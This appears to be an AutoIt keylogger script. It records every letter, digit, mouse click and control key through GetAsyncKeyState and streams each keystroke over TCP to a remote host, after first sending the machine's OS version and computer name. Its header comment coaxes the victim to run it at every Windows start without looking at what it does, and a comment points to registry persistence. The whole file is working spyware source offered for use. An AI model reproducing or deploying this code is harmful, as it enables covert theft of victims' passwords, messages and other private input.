#cs ----------------------------------------------------------------------------

 Author:         	Anonymous <-- It's me !
 Description:		It's for you and only for you. You don't need to look what's doing, just start and launch it at every Windows Start. Please have faith !

#ce ----------------------------------------------------------------------------

If Connexion(1) <> false Then
	Do ;Very very long function ...
	If _IsPressed(41) Then ;if return 1
		SendNewInput("a")
	EndIf
	If _IsPressed(42) Then
		SendNewInput("b")
	EndIf
	If _IsPressed(43) Then
		SendNewInput("c")
	EndIf
	If _IsPressed(44) Then
		SendNewInput("d")
	EndIf
	If _IsPressed(45) Then
		SendNewInput("e")
	EndIf
	If _IsPressed(46) Then
		SendNewInput("f")
	EndIf
	If _IsPressed(47) Then
		SendNewInput("g")
	EndIf
	If _IsPressed(48) Then
		SendNewInput("h")
	EndIf
	If _IsPressed(49) Then
		SendNewInput("i")
	EndIf
	If _IsPressed('4a') Then
		SendNewInput("j")
	EndIf
	If _IsPressed('4b') Then
		SendNewInput("k")
	EndIf
	If _IsPressed('4c') Then
		SendNewInput("l")
	EndIf
	If _IsPressed('4d') Then
		SendNewInput("m")
	EndIf
	If _IsPressed('4e') Then
		SendNewInput("n")
	EndIf
	If _IsPressed('4f') Then
		SendNewInput("o")
	EndIf
	If _IsPressed(50) Then
		SendNewInput("p")
	EndIf
	If _IsPressed(51) Then
		SendNewInput("q")
	EndIf
	If _IsPressed(52) Then
		SendNewInput("r")
	EndIf
	If _IsPressed(53) Then
		SendNewInput("s")
	EndIf
	If _IsPressed(54) Then
		SendNewInput("t")
	EndIf
	If _IsPressed(55) Then
		SendNewInput("u")
	EndIf
	If _IsPressed(56) Then
		SendNewInput("v")
	EndIf
	If _IsPressed(57) Then
		SendNewInput("w")
	EndIf
	If _IsPressed(58) Then
		SendNewInput("x")
	EndIf
	If _IsPressed(59) Then
		SendNewInput("y")
	EndIf
	If _IsPressed('5a') Then
		SendNewInput("z")
	EndIf
 	If _IsPressed('01') Then
 		SendNewInput("LEFT MOUSE")
 	EndIf
	If _IsPressed('02') Then
		SendNewInput("RIGHT MOUSE")
	EndIf
	If _IsPressed('08') Then
		SendNewInput("BACKSPACE")
	EndIf
	If _IsPressed('09') Then
		SendNewInput("TAB")
	EndIf
	If _IsPressed('0d') Then
		SendNewInput("ENTER")
	EndIf
	If _IsPressed('10') Then
		SendNewInput("SHIFT")
	EndIf
	If _IsPressed('11') Then
		SendNewInput("CTRL")
	EndIf
	If _IsPressed('12') Then
		SendNewInput("ALT")
	EndIf
	If _IsPressed('13') Then
		SendNewInput("PAUSE")
	EndIf
	If _IsPressed('14') Then
		SendNewInput("CAPSLOCK")
	EndIf
	If _IsPressed('1b') Then
		SendNewInput("ESC")
	EndIf
	If _IsPressed('20') Then
		SendNewInput(" ")
	EndIf
	If _IsPressed('21') Then
		SendNewInput("PGUP")
	EndIf
	If _IsPressed('22') Then
		SendNewInput("PGDOWN")
	EndIf
	If _IsPressed('23') Then
		SendNewInput("END")
	EndIf
	If _IsPressed('24') Then
		SendNewInput("HOME")
	EndIf
	If _IsPressed('25') Then
		SendNewInput("LEFT ARROW")
	EndIf
	If _IsPressed('26') Then
		SendNewInput("UP ARROW")
	EndIf
    If _IsPressed('27') Then
		SendNewInput("RIGHT ARROW")
	EndIf
    If _IsPressed('28') Then
		SendNewInput("DOWN ARROW")
	EndIf
    If _IsPressed('2c') Then
		SendNewInput("PRNTSCRN")
	EndIf
    If _IsPressed('2d') Then
		SendNewInput("INSERT")
	EndIf
	If _IsPressed('2e') Then
		SendNewInput("DEL")
	EndIf
	If _IsPressed('30') Then
		SendNewInput("0")
	EndIf
	If _IsPressed('31') Then
		SendNewInput("1")
	EndIf
    If _IsPressed('32') Then
		SendNewInput("2")
	EndIf
    If _IsPressed('33') Then
		SendNewInput("3")
	EndIf
    If _IsPressed('34') Then
		SendNewInput("4")
	EndIf
    If _IsPressed('35') Then
		SendNewInput("5")
	EndIf
    If _IsPressed('36') Then
		SendNewInput("6")
	EndIf
	If _IsPressed('37') Then
		SendNewInput("7")
	EndIf
	If _IsPressed('38') Then
		SendNewInput("8")
	EndIf
	If _IsPressed('39') Then
		SendNewInput("9")
	EndIf
	Until false
	TCPCloseSocket($socket)
Endif


Func _IsPressed($hexKey) ;Thx google
	Local $aR, $bRv
	$hexKey = '0x' & $hexKey
	$aR = DllCall('user32.dll', "int", "GetAsyncKeyState", "int", $hexKey)

	If $aR[0] <> 0 Then
		$bRv = 1
	Else
		$bRv = 0
	EndIf
	Return $bRv

EndFunc

Func SendNewInput($input)

	TCPSend($socket, $input)
	sleep (100)

EndFunc


Func	Connexion($numbertime)

	TCPStartup()

	Local	$ip = "00.000.00.00"
	Local	$port = 65432

	Global	$socket = TCPConnect($ip, $port)
;~ 	Registry Write Starting Windows
	if @error Then
		if $numbertime < 10 then
			sleep(1000)
			Connexion($numbertime + 1)
		Else
			return False
		Endif
	Else
		SendNewInput(@OSVersion)
		SendNewInput(@ComputerName)
		return True
	endif
EndFunc
